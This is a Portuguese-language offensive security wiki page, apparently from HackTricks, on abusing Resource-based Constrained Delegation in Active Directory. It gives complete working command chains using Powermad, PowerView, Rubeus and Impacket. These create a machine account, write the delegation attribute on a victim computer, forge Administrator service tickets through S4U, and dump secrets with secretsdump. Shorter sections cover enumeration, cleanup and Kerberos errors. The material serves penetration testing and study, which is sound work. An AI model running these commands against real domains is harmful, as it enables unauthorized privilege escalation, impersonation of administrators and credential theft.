# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Isto é similar ao básico [Constrained Delegation](constrained-delegation.md) mas **em vez** de dar permissões a um **objeto** para **imitar qualquer usuário contra uma máquina**. Resource-based Constrain Delegation **define** no **objeto quem pode imitar qualquer usuário contra ele**.

Neste caso, o objeto constrained terá um atributo chamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ com o nome do usuário que pode imitar qualquer outro usuário contra ele.

Outra diferença importante desta Constrained Delegation para as outras delegações é que qualquer usuário com **permissões de escrita sobre uma conta de computador** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) pode definir o **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Nas outras formas de Delegation você precisava de privilégios de domain admin).

### New Concepts

No contexto de Constrained Delegation foi dito que a flag **`TrustedToAuthForDelegation`** dentro do valor _userAccountControl_ do usuário é necessária para realizar um **S4U2Self.** Mas isso não é inteiramente verdade.\
A realidade é que mesmo sem esse valor, você pode realizar um **S4U2Self** contra qualquer usuário se você for um **service** (tiver um SPN) mas, se você **tiver `TrustedToAuthForDelegation`** o TGS retornado será **Forwardable** e se você **não tiver** essa flag o TGS retornado **não será** **Forwardable**.

No entanto, se o **TGS** usado em **S4U2Proxy** **NÃO for Forwardable** tentando abusar de uma **basic Constrain Delegation** isso **não funcionará**. Mas se você estiver tentando explorar uma **Resource-Based constrain delegation, isso funcionará**.

### Attack structure

> Se você tem **privilégios equivalentes de escrita** sobre uma conta de **Computer** você pode obter **acesso privilegiado** nessa máquina.

Suponha que o atacante já tem **privilégios equivalentes de escrita sobre o computador vítima**.

1. O atacante **compromete** uma conta que tem um **SPN** ou **cria uma** (“Service A”). Note que **qualquer** _Admin User_ sem qualquer outro privilégio especial pode **criar** até 10 objetos Computer (**_MachineAccountQuota_**) e atribuir-lhes um **SPN**. Então o atacante pode simplesmente criar um objeto Computer e definir um SPN.
2. O atacante **abusa do seu privilégio WRITE** sobre o computador vítima (ServiceB) para configurar **resource-based constrained delegation para permitir que ServiceA imite qualquer usuário** contra esse computador vítima (ServiceB).
3. O atacante usa Rubeus para realizar um **full S4U attack** (S4U2Self and S4U2Proxy) de Service A para Service B para um usuário **com acesso privilegiado ao Service B**.
1. S4U2Self (da conta com SPN comprometida/criada): Pede um **TGS de Administrator para mim** (Not Forwardable).
2. S4U2Proxy: Usa o **TGS não Forwardable** do passo anterior para pedir um **TGS** de **Administrator** para o **host vítima**.
3. Mesmo se você estiver usando um TGS não Forwardable, como está explorando resource-based constrained delegation, isso funcionará.
4. O atacante pode **pass-the-ticket** e **imitar** o usuário para obter **acesso ao ServiceB vítima**.

Para checar o _**MachineAccountQuota**_ do domínio você pode usar:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Criando um objeto de computador

Você pode criar um objeto de computador dentro do domínio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurando Delegação Restrita Baseada em Recurso

**Usando activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando um S4U attack completo (Windows/Rubeus)

Primeiro, criamos o novo objeto Computer com a password `123456`, então precisamos do hash dessa password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Isso imprimirá os hashes RC4 e AES para essa conta.\
Agora, o ataque pode ser realizado:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Você pode gerar mais tickets para vários serviços pedindo apenas uma vez usando o parâmetro `/altservice` do Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Observe que os usuários têm um atributo chamado "**Cannot be delegated**". Se um usuário tiver esse atributo como True, você não poderá se passar por ele. Essa propriedade pode ser vista dentro do bloodhound.

### Ferramentas Linux: RBCD ponta a ponta com Impacket (2024+)

Se você operar a partir do Linux, pode executar toda a cadeia RBCD usando as ferramentas oficiais do Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- Se LDAP signing/LDAPS estiver habilitado, use `impacket-rbcd -use-ldaps ...`.
- Prefira chaves AES; muitos domínios modernos restringem RC4. Impacket e Rubeus suportam fluxos apenas com AES.
- O Impacket pode reescrever o `sname` ("AnySPN") para algumas ferramentas, mas obtenha o SPN correto sempre que possível (por exemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Acessando

A última linha de comando executará a **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.\
Neste exemplo foi solicitado um TGS para o serviço **CIFS** do Administrator, então você poderá acessar **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuso de diferentes service tickets

Saiba mais sobre os [**available service tickets here**](silver-ticket.md#available-services).

## Enumeração, auditoria e limpeza

### Enumerar computadores com RBCD configurados

PowerShell (decodificando o SD para resolver SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (ler ou esvaziar com um único comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Limpeza / redefinir RBCD

- PowerShell (limpar o atributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Erros do Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Isso significa que Kerberos está configurado para não usar DES ou RC4 e você está fornecendo apenas o hash RC4. Forneça ao Rubeus pelo menos o hash AES256 (ou simplesmente forneça os hashes rc4, aes128 e aes256). Exemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Isso significa que o horário do computador atual é diferente do do DC e o Kerberos não está funcionando corretamente.
- **`preauth_failed`**: Isso significa que o nome de usuário + hashes fornecidos não estão funcionando para logon. Você pode ter esquecido de colocar o "$" dentro do nome de usuário ao gerar os hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Isto pode significar:
- O usuário que você está tentando impersonar não pode acessar o serviço desejado (porque você não pode impersoná-lo ou porque ele não tem privilégios suficientes)
- O serviço solicitado não existe (se você pedir um ticket para winrm mas winrm não estiver em execução)
- O fakecomputer criado perdeu seus privilégios sobre o servidor vulnerável e você precisa restituí-los.
- Você está abusando do KCD clássico; lembre-se que RBCD funciona com S4U2Self tickets non-forwardable, enquanto KCD requer forwardable.

## Notas, relays e alternativas

- Você também pode escrever o RBCD SD via AD Web Services (ADWS) se LDAP estiver filtrado. Veja:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Cadeias de relay Kerberos frequentemente terminam em RBCD para obter SYSTEM local em um passo. Veja exemplos práticos de ponta a ponta:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Se LDAP signing/channel binding estiverem **desabilitados** e você puder criar uma machine account, ferramentas como **KrbRelayUp** podem relay uma autenticação Kerberos coagida para LDAP, definir `msDS-AllowedToActOnBehalfOfOtherIdentity` para sua machine account no objeto de computador alvo, e imediatamente impersonar **Administrator** via S4U a partir de off-host.

## Referências

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
